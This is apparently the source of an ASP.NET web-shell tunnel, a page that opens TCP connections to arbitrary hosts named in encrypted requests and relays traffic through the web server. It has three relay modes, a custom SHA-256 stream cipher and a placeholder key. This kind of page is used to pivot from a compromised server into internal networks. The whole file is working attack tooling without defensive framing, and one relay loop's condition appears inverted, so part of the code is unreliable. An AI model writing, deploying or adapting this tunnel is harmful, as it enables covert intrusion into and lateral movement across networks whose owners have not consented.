<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Collections.Concurrent" %>
<%@ Import Namespace="System.Threading" %>
<script runat="server">
static string KEY = "CHANGE_ME";
static long ECTR = 0;

static byte[] Cp(byte[] s, int so, byte[] d, int dp, int l) { for (int i = 0; i < l; i++) d[dp + i] = s[so + i]; return d; }
static byte[] Cat(byte[] a, byte[] b) { byte[] r = new byte[a.Length + b.Length]; Cp(a, 0, r, 0, a.Length); Cp(b, 0, r, a.Length, b.Length); return r; }

static string JStr(string json, string key)
{
    string q = "\"" + key + "\"";
    int i = json.IndexOf(q);
    if (i < 0) return null;
    i += q.Length;
    while (i < json.Length && json[i] != ':') i++;
    if (i >= json.Length) return null;
    i++;
    while (i < json.Length && json[i] == ' ') i++;
    if (i >= json.Length) return null;
    if (json[i] == '"')
    {
        StringBuilder sb = new StringBuilder(); i++;
        while (i < json.Length && json[i] != '"')
        {
            if (json[i] == '\\' && i + 1 < json.Length) { i++; sb.Append(json[i]); }
            else sb.Append(json[i]); i++;
        }
        return sb.ToString();
    }
    int s = i;
    while (i < json.Length && ",} \t\r\n".IndexOf(json[i]) < 0) i++;
    return json.Substring(s, i - s);
}

static byte[][] Dk(string key)
{
    byte[] master;
    using (var sha = SHA256.Create()) master = sha.ComputeHash(Encoding.UTF8.GetBytes(key));
    byte[] ek, ak;
    using (var sha = SHA256.Create()) ek = sha.ComputeHash(Cat(master, Encoding.UTF8.GetBytes("enc")));
    using (var sha = SHA256.Create()) ak = sha.ComputeHash(Cat(master, Encoding.UTF8.GetBytes("auth")));
    return new byte[][] { ek, ak };
}

static byte[] GKS(byte[] ek, byte[] n, int len)
{
    MemoryStream ms = new MemoryStream(); int c = 0;
    while (ms.Length < len)
    {
        using (var sha = SHA256.Create())
        {
            byte[] input = new byte[ek.Length + n.Length + 4];
            Cp(ek, 0, input, 0, ek.Length);
            Cp(n, 0, input, ek.Length, n.Length);
            input[ek.Length + n.Length] = (byte)(c >> 24);
            input[ek.Length + n.Length + 1] = (byte)(c >> 16);
            input[ek.Length + n.Length + 2] = (byte)(c >> 8);
            input[ek.Length + n.Length + 3] = (byte)c;
            byte[] h = sha.ComputeHash(input);
            int r = (int)(len - ms.Length);
            if (r > h.Length) r = h.Length;
            ms.Write(h, 0, r);
        }
        c++;
    }
    return ms.ToArray();
}

static byte[] CTag(byte[] ak, byte[] n, byte[] ct)
{
    using (var hmac = new HMACSHA256(ak))
    {
        MemoryStream ms = new MemoryStream();
        ms.Write(n, 0, n.Length);
        ms.Write(ct, 0, ct.Length);
        byte[] h = hmac.ComputeHash(ms.ToArray());
        byte[] tag = new byte[16];
        Cp(h, 0, tag, 0, 16);
        return tag;
    }
}

static byte[] Dec(byte[] data, string key)
{
    try
    {
        if (data.Length < 28) return null;
        byte[][] keys = Dk(key); byte[] ek = keys[0], ak = keys[1];
        byte[] n = new byte[12]; Cp(data, 0, n, 0, 12);
        byte[] tag = new byte[16]; Cp(data, data.Length - 16, tag, 0, 16);
        byte[] ct = new byte[data.Length - 28]; Cp(data, 12, ct, 0, ct.Length);
        byte[] exp = CTag(ak, n, ct);
        for (int i = 0; i < 16; i++) if (exp[i] != tag[i]) return null;
        byte[] ks = GKS(ek, n, ct.Length); byte[] pt = new byte[ct.Length];
        for (int i = 0; i < ct.Length; i++) pt[i] = (byte)(ct[i] ^ ks[i]);
        return pt;
    }
    catch { return null; }
}

static byte[] Enc(byte[] data, string key)
{
    try
    {
        byte[][] keys = Dk(key); byte[] ek = keys[0], ak = keys[1];
        long ctr = Interlocked.Increment(ref ECTR);
        byte[] iv;
        using (var sha = SHA256.Create())
        {
            byte[] input = new byte[ek.Length + 8];
            Cp(ek, 0, input, 0, ek.Length);
            input[ek.Length] = (byte)(ctr >> 56); input[ek.Length + 1] = (byte)(ctr >> 48);
            input[ek.Length + 2] = (byte)(ctr >> 40); input[ek.Length + 3] = (byte)(ctr >> 32);
            input[ek.Length + 4] = (byte)(ctr >> 24); input[ek.Length + 5] = (byte)(ctr >> 16);
            input[ek.Length + 6] = (byte)(ctr >> 8); input[ek.Length + 7] = (byte)ctr;
            iv = sha.ComputeHash(input);
        }
        byte[] n = new byte[12]; Cp(iv, 0, n, 0, 12);
        byte[] ks = GKS(ek, n, data.Length); byte[] ct = new byte[data.Length];
        for (int i = 0; i < data.Length; i++) ct[i] = (byte)(data[i] ^ ks[i]);
        byte[] tag = CTag(ak, n, ct);
        byte[] result = new byte[12 + ct.Length + 16];
        Cp(n, 0, result, 0, 12); Cp(ct, 0, result, 12, ct.Length); Cp(tag, 0, result, 12 + ct.Length, 16);
        return result;
    }
    catch { return new byte[0]; }
}

static byte[] MkPkt(int flag, int sid, int seq, int ack, byte[] data)
{
    MemoryStream ms = new MemoryStream();
    ms.WriteByte((byte)flag);
    ms.Write(new byte[] { (byte)(sid >> 24), (byte)(sid >> 16), (byte)(sid >> 8), (byte)sid }, 0, 4);
    ms.Write(new byte[] { (byte)(seq >> 24), (byte)(seq >> 16), (byte)(seq >> 8), (byte)seq }, 0, 4);
    ms.Write(new byte[] { (byte)(ack >> 24), (byte)(ack >> 16), (byte)(ack >> 8), (byte)ack }, 0, 4);
    ms.Write(new byte[] { (byte)(data.Length >> 24), (byte)(data.Length >> 16), (byte)(data.Length >> 8), (byte)data.Length }, 0, 4);
    if (data.Length > 0) ms.Write(data, 0, data.Length);
    return ms.ToArray();
}

static int[] ParseSyn(byte[] raw)
{
    try
    {
        if (raw.Length < 2) return null;
        int cnt = (raw[0] << 8) | raw[1], off = 2;
        for (int i = 0; i < cnt; i++)
        {
            if (off + 17 > raw.Length) break;
            int flag = raw[off];
            int sid = (raw[off + 1] << 24) | (raw[off + 2] << 16) | (raw[off + 3] << 8) | raw[off + 4];
            int seq = (raw[off + 5] << 24) | (raw[off + 6] << 16) | (raw[off + 7] << 8) | raw[off + 8];
            int dlen = (raw[off + 13] << 24) | (raw[off + 14] << 16) | (raw[off + 15] << 8) | raw[off + 16];
            off += 17;
            if ((flag & 0x0F) == 0x01) return new int[] { sid, seq };
            off += dlen;
        }
    }
    catch { }
    return null;
}

static byte[] ParseSynData(byte[] raw)
{
    try
    {
        if (raw.Length < 2) return null;
        int cnt = (raw[0] << 8) | raw[1], off = 2;
        for (int i = 0; i < cnt; i++)
        {
            if (off + 17 > raw.Length) break;
            int flag = raw[off];
            int dlen = (raw[off + 13] << 24) | (raw[off + 14] << 16) | (raw[off + 15] << 8) | raw[off + 16];
            off += 17;
            if (off + dlen > raw.Length) break;
            if ((flag & 0x0F) == 0x01)
            {
                byte[] d = new byte[dlen];
                Cp(raw, off, d, 0, dlen);
                return d;
            }
            off += dlen;
        }
    }
    catch { }
    return null;
}

static Socket ConnectTarget(byte[] dd)
{
    try
    {
        int hlen = dd[0];
        string host = Encoding.UTF8.GetString(dd, 1, hlen);
        int port = (dd[1 + hlen] << 8) | dd[2 + hlen];
        Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        s.Connect(host, port);
        s.NoDelay = true;
        return s;
    }
    catch { return null; }
}

static ConcurrentDictionary<long, Socket> GetSessions(HttpApplicationState app)
{
    var m = (ConcurrentDictionary<long, Socket>)app["ysockSessions"];
    if (m == null) { m = new ConcurrentDictionary<long, Socket>(); app["ysockSessions"] = m; }
    return m;
}

static ConcurrentDictionary<string, ConcurrentQueue<byte[]>> GetQueues(HttpApplicationState app)
{
    var m = (ConcurrentDictionary<string, ConcurrentQueue<byte[]>>)app["ysockQueues"];
    if (m == null) { m = new ConcurrentDictionary<string, ConcurrentQueue<byte[]>>(); app["ysockQueues"] = m; }
    return m;
}

static ConcurrentDictionary<string, bool> GetCloseFlags(HttpApplicationState app)
{
    var m = (ConcurrentDictionary<string, bool>)app["ysockCloseFlags"];
    if (m == null) { m = new ConcurrentDictionary<string, bool>(); app["ysockCloseFlags"] = m; }
    return m;
}

static void WriteFrame(Stream os, int typeByte, byte[] data)
{
    byte[] payload = new byte[1 + data.Length];
    payload[0] = (byte)typeByte;
    Cp(data, 0, payload, 1, data.Length);
    byte[] encrypted = Enc(payload, KEY);
    byte[] lenBuf = new byte[] {
        (byte)((encrypted.Length >> 24) & 0xFF), (byte)((encrypted.Length >> 16) & 0xFF),
        (byte)((encrypted.Length >> 8) & 0xFF), (byte)(encrypted.Length & 0xFF)
    };
    os.Write(lenBuf, 0, 4);
    os.Write(encrypted, 0, encrypted.Length);
    os.Flush();
}

static byte[] ReadFrameFromStream(Stream is_)
{
    byte[] lenBuf = new byte[4]; int total = 0;
    while (total < 4) { int n = is_.Read(lenBuf, total, 4 - total); if (n == -1 || n == 0) return null; total += n; }
    int frameLen = (lenBuf[0] << 24) | (lenBuf[1] << 16) | (lenBuf[2] << 8) | lenBuf[3];
    if (frameLen <= 0 || frameLen > 262144) return null;
    byte[] frameBuf = new byte[frameLen]; total = 0;
    while (total < frameLen) { int n = is_.Read(frameBuf, total, frameLen - total); if (n == -1 || n == 0) return null; total += n; }
    byte[] decrypted = Dec(frameBuf, KEY);
    if (decrypted == null || decrypted.Length < 1) return null;
    return decrypted;
}

static string ReadJsonFromStream(Stream is_)
{
    MemoryStream bos = new MemoryStream();
    int depth = 0; bool inStr = false; bool esc = false;
    int b;
    while ((b = is_.ReadByte()) != -1)
    {
        bos.WriteByte((byte)b);
        char ch = (char)b;
        if (inStr)
        {
            if (esc) esc = false;
            else if (ch == '\\') esc = true;
            else if (ch == '"') inStr = false;
        }
        else
        {
            if (ch == '"') inStr = true;
            else if (ch == '{') depth++;
            else if (ch == '}') { depth--; if (depth == 0) break; }
        }
    }
    return Encoding.UTF8.GetString(bos.ToArray());
}

static void ClassicReadLoop(long sid, Socket sock, HttpApplicationState app)
{
    var queues = GetQueues(app);
    byte[] buf = new byte[65536];
    try
    {
        while (!sock.Connected || GetCloseFlags(app).ContainsKey("c_" + sid))
        {
            if (GetCloseFlags(app).ContainsKey("c_" + sid)) break;
            int n = sock.Receive(buf);
            if (n == 0) break;
            byte[] chunk = new byte[n];
            Cp(buf, 0, chunk, 0, n);
            ConcurrentQueue<byte[]> rq;
            if (queues.TryGetValue("r_" + sid, out rq)) rq.Enqueue(chunk);
        }
    }
    catch { }
    finally
    {
        ConcurrentQueue<byte[]> rq;
        if (queues.TryGetValue("r_" + sid, out rq)) rq.Enqueue(new byte[0]);
        try { sock.Close(); } catch { }
        GetSessions(app).TryRemove(sid, out _);
    }
}

static void HalfDuplexReadLoop(int sid, Socket sock, Stream ros, ConcurrentDictionary<string, bool> closeFlags)
{
    byte[] buf = new byte[65536];
    try
    {
        while (sock.Connected && !closeFlags.ContainsKey("c_" + sid))
        {
            int n = sock.Receive(buf);
            if (n == 0) break;
            byte[] chunk = new byte[n];
            Cp(buf, 0, chunk, 0, n);
            lock (ros) { WriteFrame(ros, 0x01, chunk); }
        }
    }
    catch { }
    finally
    {
        try { lock (ros) { WriteFrame(ros, 0x02, new byte[0]); } } catch { }
        closeFlags["c_" + sid] = true;
        try { sock.Close(); } catch { }
    }
}

static void FullDuplexReadLoop(int sid, Socket sock, Stream ros, HttpApplicationState app)
{
    byte[] buf = new byte[65536];
    try
    {
        while (sock.Connected)
        {
            int n = sock.Receive(buf);
            if (n == 0) break;
            byte[] chunk = new byte[n];
            Cp(buf, 0, chunk, 0, n);
            lock (ros) { WriteFrame(ros, 0x01, chunk); }
        }
    }
    catch { }
    finally
    {
        try { lock (ros) { WriteFrame(ros, 0x02, new byte[0]); } } catch { }
        try { sock.Close(); } catch { }
        GetSessions(app).TryRemove(sid, out _);
    }
}

static string B64E(byte[] b) { return Convert.ToBase64String(b); }
static byte[] B64D(string s) { return Convert.FromBase64String(s); }
</script>
<%
Response.BufferOutput = false;
string reqCT = Request.ContentType;
bool isFullDuplexReq = reqCT != null && reqCT.StartsWith("application/octet-stream");

if (isFullDuplexReq)
{
    // === Full Duplex ===
    try
    {
        Stream reqIS = Request.InputStream;
        string body = ReadJsonFromStream(reqIS);
        string action = JStr(body, "a");
        if (action != "f")
        {
            Response.ContentType = "application/json";
            Response.Write("{\"d\":\"\"}");
            return;
        }
        string rd = JStr(body, "d");
        if (rd == null) { Response.ContentType = "application/json"; Response.Write("{\"d\":\"\"}"); return; }
        byte[] raw = Dec(B64D(rd), KEY);
        if (raw == null || raw.Length < 2) { Response.ContentType = "application/json"; Response.Write("{\"d\":\"\"}"); return; }
        byte[] synDataBytes = ParseSynData(raw);
        int[] synInfo = ParseSyn(raw);
        if (synDataBytes == null || synInfo == null) { Response.ContentType = "application/json"; Response.Write("{\"d\":\"\"}"); return; }
        int sid = synInfo[0]; int seq = synInfo[1];

        Response.ContentType = "application/octet-stream";
        Response.Headers["X-Accel-Buffering"] = "no";
        Response.Headers["Cache-Control"] = "no-cache";
        Stream ros = Response.OutputStream;

        Socket sock = ConnectTarget(synDataBytes);
        if (sock == null)
        {
            MemoryStream fb = new MemoryStream();
            fb.WriteByte(0); fb.WriteByte(1);
            fb.Write(MkPkt(0x00, sid, 0, seq, new byte[0]), 0, 17);
            WriteFrame(ros, 0x00, fb.ToArray());
            return;
        }
        GetSessions(Application).TryAdd(sid, sock);

        lock (ros) { WriteFrame(ros, 0x00, new byte[0]); }

        var app2 = Application;
        new Thread(() => { FullDuplexReadLoop(sid, sock, ros, app2); }) { IsBackground = true }.Start();

        try
        {
            NetworkStream sockStream = new NetworkStream(sock);
            while (sock.Connected)
            {
                byte[] frame = ReadFrameFromStream(reqIS);
                if (frame == null) break;
                byte typeByte = frame[0];
                byte[] data = new byte[frame.Length - 1];
                if (data.Length > 0) Cp(frame, 1, data, 0, data.Length);
                if (typeByte == 0x01 && data.Length > 0) sock.Send(data);
                else if (typeByte == 0x02) break;
            }
        }
        catch { }
        finally
        {
            try { sock.Close(); } catch { }
            GetSessions(Application).TryRemove(sid, out _);
        }
    }
    catch { }
    return;
}

// === Non-Full-Duplex: JSON processing ===
string bodyStr = "";
using (var sr = new StreamReader(Request.InputStream)) bodyStr = sr.ReadToEnd();
if (string.IsNullOrEmpty(bodyStr)) { Response.ContentType = "application/json"; Response.Write("{\"d\":\"\"}"); return; }

string act = JStr(bodyStr, "a");
if (act == null) { Response.ContentType = "application/json"; Response.Write("{\"d\":\"\"}"); return; }
Response.ContentType = "application/json";

try
{
    if (act == "h")
    {
        string rd = JStr(bodyStr, "d");
        if (rd == null) { Response.Write("{\"d\":\"\",\"m\":3}"); return; }
        byte[] raw = Dec(B64D(rd), KEY);
        if (raw == null) { Response.Write("{\"d\":\"\",\"m\":3}"); return; }
        Response.Write("{\"d\":\"" + B64E(Enc(raw, KEY)) + "\",\"m\":2}");
        return;
    }
    if (act == "c")
    {
        string rd = JStr(bodyStr, "d");
        if (rd == null) { Response.Write("{\"d\":\"\"}"); return; }
        byte[] raw = Dec(B64D(rd), KEY);
        if (raw == null || raw.Length < 2) { Response.Write("{\"d\":\"\"}"); return; }
        byte[] synData = ParseSynData(raw);
        int[] synInfo = ParseSyn(raw);
        if (synData == null || synInfo == null) { Response.Write("{\"d\":\"\"}"); return; }
        int sid = synInfo[0]; int seq = synInfo[1];
        Socket sock = ConnectTarget(synData);
        if (sock == null)
        {
            MemoryStream fb = new MemoryStream();
            fb.WriteByte(0); fb.WriteByte(1);
            fb.Write(MkPkt(0x00, sid, 0, seq, new byte[0]), 0, 17);
            Response.Write("{\"d\":\"" + B64E(Enc(fb.ToArray(), KEY)) + "\"}");
            return;
        }
        GetSessions(Application).TryAdd((long)sid, sock);
        var closeFlags = GetCloseFlags(Application);
        var queues = GetQueues(Application);
        var wq = new ConcurrentQueue<byte[]>();
        queues.TryAdd("w_" + sid, wq);

        Response.ContentType = "application/octet-stream";
        Response.Headers["X-Accel-Buffering"] = "no";
        Response.Headers["Cache-Control"] = "no-cache";
        WriteFrame(Response.OutputStream, 0x00, new byte[0]);

        Stream ros = Response.OutputStream;
        Socket fsock = sock;
        new Thread(() => { HalfDuplexReadLoop(sid, fsock, ros, closeFlags); }) { IsBackground = true }.Start();

        long lastActivity = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
        while (true)
        {
            if (closeFlags.ContainsKey("c_" + sid)) break;
            byte[] wd = null;
            if (wq.TryDequeue(out wd) && wd != null && wd.Length > 0)
            {
                try { sock.Send(wd); lastActivity = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(); }
                catch { break; }
            }
            else
            {
                Thread.Sleep(50);
            }
            if (!sock.Connected) break;
            if (DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() - lastActivity > 300000)
            {
                try { sock.Close(); } catch { }
                break;
            }
        }
        closeFlags.TryRemove("c_" + sid, out _);
        queues.TryRemove("w_" + sid, out _);
        GetSessions(Application).TryRemove(sid, out _);
        return;
    }
    if (act == "d")
    {
        string idStr = JStr(bodyStr, "id"); string rd = JStr(bodyStr, "d");
        if (idStr == null || rd == null) { Response.Write("{\"ok\":false}"); return; }
        long sid = long.Parse(idStr);
        byte[] raw = Dec(B64D(rd), KEY);
        if (raw == null) { Response.Write("{\"ok\":false}"); return; }
        ConcurrentQueue<byte[]> wq;
        if (!GetQueues(Application).TryGetValue("w_" + sid, out wq) || wq == null) { Response.Write("{\"ok\":false}"); return; }
        wq.Enqueue(raw);
        Response.Write("{\"ok\":true}");
        return;
    }
    if (act == "x")
    {
        string idStr = JStr(bodyStr, "id");
        if (idStr == null) { Response.Write("{\"ok\":false}"); return; }
        long sid = long.Parse(idStr);
        GetCloseFlags(Application)["c_" + sid] = true;
        Response.Write("{\"ok\":true}");
        return;
    }
    if (act == "cc")
    {
        string rd = JStr(bodyStr, "d");
        if (rd == null) { Response.Write("{\"d\":\"\"}"); return; }
        byte[] raw = Dec(B64D(rd), KEY);
        if (raw == null || raw.Length < 2) { Response.Write("{\"d\":\"\"}"); return; }
        byte[] synData = ParseSynData(raw);
        int[] synInfo = ParseSyn(raw);
        if (synData == null || synInfo == null) { Response.Write("{\"d\":\"\"}"); return; }
        int sid = synInfo[0]; int seq = synInfo[1];
        Socket sock = ConnectTarget(synData);
        if (sock == null)
        {
            MemoryStream fb = new MemoryStream();
            fb.WriteByte(0); fb.WriteByte(1);
            fb.Write(MkPkt(0x00, sid, 0, seq, new byte[0]), 0, 17);
            Response.Write("{\"d\":\"" + B64E(Enc(fb.ToArray(), KEY)) + "\"}");
            return;
        }
        GetSessions(Application).TryAdd((long)sid, sock);
        var queues = GetQueues(Application);
        queues.TryAdd("r_" + sid, new ConcurrentQueue<byte[]>());
        queues.TryAdd("w_" + sid, new ConcurrentQueue<byte[]>());
        MemoryStream fb2 = new MemoryStream();
        fb2.WriteByte(0); fb2.WriteByte(1);
        fb2.Write(MkPkt(0x04, sid, 0, seq, new byte[0]), 0, 17);
        Response.Write("{\"d\":\"" + B64E(Enc(fb2.ToArray(), KEY)) + "\",\"id\":\"" + sid + "\"}");
        var app2 = Application;
        new Thread(() => { ClassicReadLoop(sid, sock, app2); }) { IsBackground = true }.Start();
        return;
    }
    if (act == "cp")
    {
        string idStr = JStr(bodyStr, "id"); string rd = JStr(bodyStr, "d");
        long sid = 0;
        if (!string.IsNullOrEmpty(idStr)) sid = long.Parse(idStr);
        if (!string.IsNullOrEmpty(rd) && sid > 0)
        {
            byte[] raw = Dec(B64D(rd), KEY);
            if (raw != null)
            {
                Socket sock;
                if (GetSessions(Application).TryGetValue(sid, out sock) && sock.Connected)
                {
                    try { sock.Send(raw); } catch { GetSessions(Application).TryRemove(sid, out _); }
                }
            }
        }
        if (sid > 0)
        {
            var queues = GetQueues(Application);
            ConcurrentQueue<byte[]> rq;
            MemoryStream db = new MemoryStream(); bool fin = false;
            if (queues.TryGetValue("r_" + sid, out rq))
            {
                byte[] chunk;
                while (rq.TryDequeue(out chunk))
                {
                    if (chunk.Length == 0) { fin = true; break; }
                    db.Write(chunk, 0, chunk.Length);
                }
            }
            byte[] rd2 = db.ToArray();
            Socket sock2;
            if (!GetSessions(Application).TryGetValue(sid, out sock2) || !sock2.Connected) fin = true;
            if (rd2.Length > 0)
            {
                MemoryStream fb2 = new MemoryStream();
                fb2.WriteByte(0); fb2.WriteByte(1);
                fb2.Write(MkPkt(0x02, (int)sid, 0, 0, rd2), 0, 17 + rd2.Length);
                Response.Write("{\"d\":\"" + B64E(Enc(fb2.ToArray(), KEY)) + "\",\"fin\":" + fin.ToString().ToLower() + "}");
            }
            else if (fin)
            {
                MemoryStream fb2 = new MemoryStream();
                fb2.WriteByte(0); fb2.WriteByte(1);
                fb2.Write(MkPkt(0x08, (int)sid, 0, 0, new byte[0]), 0, 17);
                Response.Write("{\"d\":\"" + B64E(Enc(fb2.ToArray(), KEY)) + "\",\"fin\":true}");
            }
            else
            {
                Response.Write("{\"d\":\"\",\"fin\":false}");
            }
            return;
        }
        Response.Write("{\"d\":\"\",\"fin\":false}");
        return;
    }
    Response.Write("{\"d\":\"\"}");
}
catch { try { Response.Write("{\"d\":\"\"}"); } catch { } }
%>